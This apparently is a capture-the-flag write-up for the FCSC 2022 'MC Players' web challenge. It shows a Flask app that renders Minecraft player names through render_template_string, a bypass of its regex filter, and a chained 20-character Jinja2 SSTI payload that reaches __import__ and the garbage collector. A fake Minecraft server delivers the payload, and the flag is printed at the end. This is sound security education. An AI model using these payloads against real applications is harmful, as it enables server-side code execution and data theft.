---
source: kevin-mizu
source_url: https://mizu.re/post/mc_players
title: "MC Players | mizu.re"
description: "MC Players"
---

_keyboard\_arrow\_up_

title: MC Players

date: May 08, 2022

tags: [Writeup](https://mizu.re/tag/Writeup) [FCSC2022](https://mizu.re/tag/FCSC2022) [Web](https://mizu.re/tag/Web)

# MC Players

## Table of contents

- Challenge information
- Recon
- SSTI
- Exploit chain
- Getting the flag

## Challenge information

Difficulty: 3 stars.

Description: Cela fait plusieurs mois que le service de Dinnerbone permettant de récupérer le statut d'un serveur Minecraft n'est plus actif. Nous avons donc décidé de proposer une alternative réutilisant sa librairie mcstatus.

url: [https://mc-players.france-cybersecurity-challenge.fr/](https://mc-players.france-cybersecurity-challenge.fr/)

## Recon

This challenge comes up with a web Minecraft server status service, which can be used to gather information about connected users on a Minecraft server. It is also important to notice that Minecraft server's name and IPs are displayed too.

![home_list](https://mizu.re/articles/writeups/FCSC2022/web/mc_players/images/home_list.png)

When sending an invalid server address, an error message is displayed.

![home_error](https://mizu.re/articles/writeups/FCSC2022/web/mc_players/images/home_error.png)

Now that we know how the website works on the client side, we need to go deeper by looking the server's source code to understand what is happening when are making a request. Going to `src/web/app/app.py` in the source files, we can find everything we need next.

```py
#!/usr/bin/env python3
# coding: utf-8

import re
import requests
from mcstatus import JavaServer
from flask import Flask, render_template, render_template_string, request

FLAG = requests.get('http://mc-players-flag:1337/').text

app = Flask(__name__, template_folder='./')
app.config['DEBUG'] = False

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method != 'POST' or 'server' not in request.form.keys():
        return render_template('index.html')

    server = request.form['server'].split(':')
    if len(server) == 2:
        hostname = server[0]
        port = int(server[1])
    else:
        hostname = server[0]
        port = 25565

    try:
        ms = JavaServer(hostname, port)
        status = ms.status()
    except:
        error = '''
            <br>
            <div class='alert alert-danger' role='alert'>
                An error occurred while communicating with the MC server.
            </div>
        '''
        return render_template('index.html', error=error)

    players = []
    if status.players.sample is not None:
        for player in status.players.sample:
            if re.match(r'\w*', player.name) and len(player.name) <= 20:
                players.append(player.name)

    html_player_list = f'''
        <br>
        <h3>{hostname} ({len(players)}/{status.players.max})</h3>
        <ul>
    '''
    for player in players:
        html_player_list += '<li>' + player + '</li>'
    html_player_list += '</ul>'

    results = render_template_string(html_player_list)
    return render_template('index.html', results=results)

@app.route('/flag', methods=['GET'])
def flag():
    if request.remote_addr != '13.37.13.37':
        return 'Unauthorized IP address: ' + request.remote_addr
    return FLAG

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=2156, threaded=False)
```

Reading the code, several important information can catch our eyes:

- The flag is stored on a global variable.

```py
FLAG = requests.get('http://mc-players-flag:1337/').text
```

- Player's usernames are rendered on the page if their length is lower than 20 and they match a specific regex.

```py
if re.match(r'\w*', player.name) and len(player.name) <= 20:
    players.append(player.name)
```

- Insecure `render_template_string` function is used to render the players list which can lead to SSTI if we have the control of one value.

```py
results = render_template_string(html_player_list)
return render_template('index.html', results=results)
```

- The website has a second endpoint which gives the flag for every user coming from `13.37.13.37`.

```py
@app.route('/flag', methods=['GET'])
def flag():
    if request.remote_addr != '13.37.13.37':
        return 'Unauthorized IP address: ' + request.remote_addr
    return FLAG
```

## SSTI

Now that we have a good understanding of the website, we need to find a way to exploit it in order to exfiltrate the flag. Using what we found on the previous step, we know that we need to put an SSTI payload on players’ usernames. So, we need to first find a way to bypass the restriction we saw earlier.

```py
if re.match(r'\w*', player.name) and len(player.name) <= 20:
    players.append(player.name)
```

At a first look, it seems impossible to inject special chars but it's just a trap. (Which works very well because it took me at least 1 hour to understand it 🥲)

![regex1](https://mizu.re/articles/writeups/FCSC2022/web/mc_players/images/regex1.png)

![regex2](https://mizu.re/articles/writeups/FCSC2022/web/mc_players/images/regex2.png)

_For the next tries, I used a custom instance, in order to test my payloads._

```py
from flask import Flask, render_template, render_template_string, request
import re

FLAG = "FCSC{FAKE_FLAG}"

app = Flask(__name__)

@app.route('/', methods=['GET'])
def index():
    payload = request.args.get("payload")
    payload = payload.split(";")

    players = []
    for player in payload:
        if re.match(r'\w*', player) and len(player) <= 20:
            players.append(player)

    html_player_list = ""
    for player in players:
        html_player_list += '<li>' + player + '</li>'
    html_player_list += '</ul>'

    results = render_template_string(html_player_list)
    return results

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, threaded=False)
```

We have found a way to bypass the first restriction but, it is not enough. In fact, we can only inject a payload of 20 chars long, which is absolutely not sufficient to get a powerful SSTI. The trick here was to use a username to set a variable for the next one. In that way, it was possible to craft a special payload bypassing all the restriction.

```py
{%set x=self%}
{%set x=x.__init__%}
{%set a='__glob'%}
{%set a=a+'als__'%}
{{x}}
```

![SSTI1](https://mizu.re/articles/writeups/FCSC2022/web/mc_players/images/SSTI1.png)

Now, the last step is to find the flag. Why is it not so easy? Because, getting an RCE is not useful in our situation. As we can see on the following picture, even being connected to the server, we can't request the flag from the initial endpoint.

![get_flag_error](https://mizu.re/articles/writeups/FCSC2022/web/mc_players/images/get_flag_error.png)

Same, having access to the server didn't give us the possibility to get the flag from `/flag` because, the remote IP needs to be `13.37.13.37` not `127.0.0.1`.

```py
@app.route('/flag', methods=['GET'])
def flag():
    if request.remote_addr != '13.37.13.37':
        return 'Unauthorized IP address: ' + request.remote_addr
    return FLAG
```

At this point, there is only one issue left for us, get the flag via the SSTI. For this part, several techniques could be used. But, for my part, after seeing that the variable was defined in the global context of the script, I immediately think about using the python [garbage collector](https://stackify.com/python-garbage-collection/) to get it.

Using the length bypass described just before, we could simply reach the python's import module to access the garbage collector and leak the flag!

```py
{%set x=self%}
{%set x=x.__init__%}
{%set a='__glob'%}
{%set a=a+'als__'%}
{%set x=x[a]%}
{%set a='__buil'%}
{%set a=a+'tins__'%}
{%set x=x[a]%}
{%set a='__imp'%}
{%set a=a+'ort__'%}
{%set x=x[a]%}
{%set x=x('gc')%}
{{x.get_objects()}}
```

![SSTI2](https://mizu.re/articles/writeups/FCSC2022/web/mc_players/images/SSTI2.png)

## Exploit chain

The last step of this challenge, but not the least, was to find a way to send the payload we craft earlier to the server. To do that, I searched for a way of changing the Minecraft server response using a [docker](https://hub.docker.com/r/itzg/minecraft-server) but, I didn't find any way to do it. After hours of failing, I finally came up with an idea, does projects of fake Minecraft servers that response to status requests already exist? And ... yes! Using one of them ( [https://github.com/MrAdhit/FakeMCServer](https://github.com/MrAdhit/FakeMCServer)) and changing the "index.js" file that contains users to:

```js
"players": {
    "max": 100,
    "online": 5,
    "sample": [\
        {\
            "name": "{{self}}",\
            "id": "00222178-15ae-4ba7-8816-dd0fcae5382b"\
        }\
    ]
},
```

Gave me:

![SSTI3](https://mizu.re/articles/writeups/FCSC2022/web/mc_players/images/SSTI3.png)

## Getting the flag

At this point, we have everything to flag, start the fake Minecraft server on our VPS containing our payload and making the request from the production server will give us the flag!

![flag1](https://mizu.re/articles/writeups/FCSC2022/web/mc_players/images/flag1.png)

![flag2](https://mizu.re/articles/writeups/FCSC2022/web/mc_players/images/flag2.png)

Flag: `FCSC{4141f870d98724a3c32b138888e72c5de4e3c793fe1410e1e269d551ae3b3b0f}` 🎉

[_keyboard\_arrow\_left_ Avatar Generator](https://mizu.re/post/avatar_generator)

[How I was able to rick roll every users on root-me.org _keyboard\_arrow\_right_](https://mizu.re/post/how-i-was-able-to-rick-roll-every-users-on-root-me.org)